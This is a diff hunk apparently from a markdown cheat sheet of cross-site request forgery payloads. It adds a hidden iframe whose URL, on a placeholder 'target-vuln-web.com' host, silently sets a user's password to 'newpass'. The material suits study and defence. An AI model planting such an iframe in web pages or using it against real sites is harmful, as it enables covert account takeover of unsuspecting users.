@@ -45,7 +45,7 @@ password=newpass&comfirm_password=newpass
 
 >Using Iframe Tag
 ```
- <iframe src="" style="display:none;"></iframe> 
+ <iframe src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass" style="display:none;"></iframe> 
 ```
 
 >Using Embed Tag
